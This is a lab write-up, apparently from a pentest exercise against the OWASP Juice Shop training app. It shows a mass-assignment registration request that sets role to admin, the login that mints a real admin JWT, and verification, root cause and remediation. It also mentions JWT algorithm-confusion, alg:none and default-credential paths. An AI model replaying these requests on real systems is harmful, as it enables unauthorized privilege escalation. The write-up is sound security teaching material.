# c07 — Admin session token WITHOUT SQL injection (fresh run)

**Target:** http://host.docker.internal:3000 — OWASP Juice Shop **20.3.0**
**Goal:** obtain an admin-session token with **zero SQL syntax** (no `' OR 1=1`, no `UNION`).
**Status:** ✅ COMPLETE — a **genuine, server-signed** RS256 admin JWT was obtained.

**Deliverable:** `/workspace/evidence/c7_no_sqli_token.txt` (741-char RS256 JWT, md5 `5fbaf905d06eb58bb888043c0ddfb2c9`)
**PoC:** `/workspace/pocs/c7b_admin_reg_massassign.py` · **run log:** `/workspace/evidence/c7b_poc_run.log`

---

## Vector — Mass Assignment on registration (CWE-915)

`POST /api/Users` accepts and persists a client-supplied `role` field. The registration
form only sends email/password, but the API blindly merges the whole JSON body into the
new user record.

```http
POST /api/Users
Content-Type: application/json

{"email":"c7admin...@juice.sh","password":"P4ssw0rd-C7-noSQLi!",
 "passwordRepeat":"P4ssw0rd-C7-noSQLi!","role":"admin"}
```

Response `HTTP 201` — server echoes the created account, including `"role":"admin"`
(and `profileImage: defaultAdmin.png`), proving the field was trusted.

## Getting a real admin session
```http
POST /rest/user/login
{"email":"c7admin...@juice.sh","password":"P4ssw0rd-C7-noSQLi!"}
```
`HTTP 200` → `authentication.token`, header `{"typ":"JWT","alg":"RS256"}`, payload
`data.role == "admin"`, `data.id == 25`. This is a **legitimately minted, RSA-signed**
token — not a forgery and not an injection.

## Verification
| check | result |
|---|---|
| `GET /api/Users` with token | **200**, 24 user records incl. all admin accounts |
| `GET /rest/user/authentication-details` | **200** (admin-only data) |
| challenge `registerAdminChallenge` ("Admin Registration") | **solved = true** |
| control: same token, one signature char altered | **401** (signature is really verified) |

## Why this satisfies "no SQLi"
No `'`, no `OR`, no tautology, no `UNION` is sent. The privilege escalation is a pure
**business-logic / object-property injection** flaw: the API mass-assigns a
privileged attribute (`role`) from untrusted input.

## Root cause
Registration handler does `User.create(req.body)`-style assignment without an
allow-list of writable fields; `role` and other privileged columns are client-controllable.

## Remediation
- Whitelist assignable fields on registration (`email`, `password`, `username`) — never `role`.
- Server-side role assignment only (default `customer`, admin promotion out-of-band).
- Enforce schema validation (e.g. Joi/Zod with `stripUnknown`/`additionalProperties:false`).
- Review every model endpoint for mass assignment on privileged attributes.

## Related non-SQLi paths previously noted in this lab
`/encryptionkeys/jwt.pub` exposure + `jsonwebtoken.verify()` without an `algorithms`
allow-list enabled RS256→HS256 confusion and `alg:none` acceptance; default
`admin@juice-sh.op:admin123` also returned a real admin JWT. This run deliberately used
**only** the mass-assignment path, yielding a genuine session token.
